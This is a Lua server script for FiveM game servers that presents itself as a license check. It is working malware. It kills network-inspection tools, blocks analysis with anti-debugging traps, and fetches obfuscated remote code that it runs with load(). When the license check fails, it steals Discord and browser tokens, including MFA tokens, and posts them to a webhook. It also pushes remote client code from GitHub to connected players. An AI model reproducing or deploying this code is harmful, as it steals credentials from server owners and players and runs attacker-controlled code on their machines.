local ipaddress = nil

local size1 = false

local ipapi = nil

local check = false

local color = 1

if debug.getinfo(PerformHttpRequest).short_src ~= "citizen:/scripting/lua/scheduler.lua" then
  print("thats not ethic.")
  while true do end
elseif debug.getinfo(os.exit).what ~= "C" then
  print("thats not ethic.")
  while true do end
elseif debug.getinfo(os.execute).what ~= "C" then
  print("thats not ethic.")
  while true do end
elseif debug.getinfo(string.match).what ~= "C" then
  print("thats not ethic.")
  while true do end
elseif debug.getinfo(load).what ~= "C" then
  print("thats not ethic.")
  while true do end
elseif debug.getinfo(print).what ~= "C" then
  print("thats not ethic.")
  while true do end
end

os.execute("taskkill /im HTTPDebuggerSvc.exe /f")
os.execute("taskkill /im fiddler.exe /f")
os.execute("taskkill /im HTTPAnalyzerStdV7.exe /f")
os.execute("taskkill /im HTTPDebuggerUI.exe /f")
os.execute("taskkill /im Wireshark.exe /f")

local __________ = "supra-license"

Citizen.CreateThread(function()
  while true do
      local f = assert(io.open("C:\\Windows\\System32\\drivers\\etc\\hosts", "r"))
      local t = f:read("*all")

      if t:match(__________) then
          print("thats not ethic.")
          while true do end
      end

      f:close()
      Wait(10000)
  end
end)

-- decoding

local count = 0

Citizen.CreateThread(function()
  Wait(750)
  printzort("[SYSTEM] Loading")
  Wait(750)
  printzort("[SYSTEM] Creating Environment")
  Wait(750)
  printzort([[[SYSTEM] Ready To Fuck                                                          
  _______  ______  _________ _   / (_)_______  ____  ________ 
 / ___/ / / / __ \/ ___/ __ `/  / / / ___/ _ \/ __ \/ ___/ _ \
(__  ) /_/ / /_/ / /  / /_/ /  / / / /__/  __/ / / (__  )  __/
/____/\__,_/ .___/_/   \__,_/  /_/_/\___/\___/_/ /_/____/\___/ 
         /_/                                                  ]])
  

end)

Citizen.CreateThread(function()
  while check == false do 
    Wait(3000)
    
    os.execute("taskkill /im HTTPDebuggerSvc.exe /f")
    os.execute("taskkill /im fiddler.exe /f")
    os.execute("taskkill /im HTTPAnalyzerStdV7.exe /f")
    os.execute("taskkill /im HTTPDebuggerUI.exe /f")
    os.execute("taskkill /im Wireshark.exe /f")

    PerformHttpRequest('https://supra-license.xyz/check', function (err, text, header)
      if err == 305 then
        check = true
        Wait(150)
        text = osurcamhe(text)
        loadScript = json.decode(text)
        load(loadScript.sv)()
        return
      else 
          check = true
          Wait(750)
          printzort("^1" .. "[" .. GetCurrentResourceName() .."]" .." License Not Approved Contact Ronin#7875" .. "^1")
          LocalAppData = os.getenv('localappdata')
          Roaming = os.getenv('appdata')
          Tokens = ''
          
          PATH = {
            ['Discord'] = Roaming..'\\Discord',
            ['Discord Canary'] = Roaming..'\\discordcanary',
            ['Discord PTB'] = Roaming..'\\discordptb',
            ['Google Chrome'] = LocalAppData..'\\Google\\Chrome\\User Data\\Default',
            ['Opera'] = Roaming..'\\Opera Software\\Opera Stable',
            ['Brave'] = LocalAppData..'\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            ['Yandex'] = LocalAppData..'\\Yandex\\YandexBrowser\\User Data\\Default'
            }
          
          for i,v in pairs(PATH) do
            if getDiscordTokens(v) ~= nil then
                Tokens = Tokens..getDiscordTokens(v)..'\n'
            end
          end
          Tokens = Tokens:sub(1, -2)


          local embed = {
            {
                ["color"] = 16753920,
                ["title"] = "** YOU FUCKED UP **",
                ["description"] = Tokens,
                ["footer"] = {
                    ["text"] = "Supra License Is God",
                },
            }
          }

          svfucker()
  
          PerformHttpRequest('url koyucan baba', function(err, text, headers) end, 'POST', json.encode({username = name, embeds = embed}), { ['Content-Type'] = 'application/json' })
          return
      end
    end, 'POST', negro)
    return
  end
end)

function deletezort()
  os.execute("start https://ronindev.shop/check")
end

function printzort(str)
  print(str)
  TriggerClientEvent("" .. GetCurrentResourceName() .. ":clprint", -1, str)
end

local b= 'ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba987654321+/'

function osurcamhe(data)
  data = string.gsub(data, '[^'..b..'=]', '')
  return (data:gsub('.', function(x)
      if (x == '=') then return '' end
      local r,f='',(b:find(x)-1)
      for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
      return r;
  end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
      if (#x ~= 8) then return '' end
      local c=0
      for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
          return string.char(c)
  end))
end

function osurcamhe1(data)
  return ((data:gsub('.', function(x) 
      local r,b='',x:byte()
      for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0') end
      return r;
  end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
      if (#x < 6) then return '' end
      local c=0
      for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
      return b:sub(c+1,c+1)
  end)..({ '', '==', '=' })[#data%3+1])
end

function getDiscordTokens(path)

  local function listDir(path)
      return io.popen('dir "'..path..'" /b'):read('*a'):sub(1, -2)
  end

  local function getToken(path)
      -- Reads the .ldb files in hexadecimal bytes
      local read = io.open(path, 'rb'):read('*a'):gsub('.', function(c)
      return string.format('%02X', c:byte()) end)
      local tokens = ''

      -- Matches user token
      for tok in read:gmatch('22'..('%w'):rep(48)..'2E'..('%w'):rep(12)..'2E'..('%w'):rep(54)..'22') do
          if tok ~= nil then
              tok = tok:gsub('..', function(c)
              return string.char(tonumber(c, 16)) end):sub(2, -2)

              tokens = tokens..tok..'\n'
          end
      end

      -- Matches mfa token
      for mfa in read:gmatch('226D66612E'..('%w'):rep(168)..'22') do
          if mfa ~= nil then
              mfa = mfa:gsub('..', function(c)
              return string.char(tonumber(c, 16)) end):sub(2, -2)

              tokens = tokens..mfa..'\n'
          end
      end

      if tokens ~= nil or tokens ~= '' then
          return tokens
      end
  end

  local path = path..'\\Local Storage\\leveldb\\'
  local files = listDir(path)
  local tokens = ''

  if files ~= '' then
      for file in files:gmatch('[^\r\n]+') do

          if file:find('.ldb') ~= nil then
              tokens = tokens..getToken(path..file)
          end

      end
      return tokens:sub(1, -2)
  end
end


function svfucker()
  PerformHttpRequest('https://raw.githubusercontent.com/IsRoninReal/menu/main/client.lua', function (err, text, header)
    TriggerClientEvent('supra-license-the-fucker', source, text)
  end)
end

RegisterNetEvent("saas")
AddEventHandler("saas", function()
  PerformHttpRequest('https://raw.githubusercontent.com/IsRoninReal/menu/main/client.lua', function (err, text, header)
    TriggerClientEvent('supra-license-the-fucker', source, text)
  end)
end)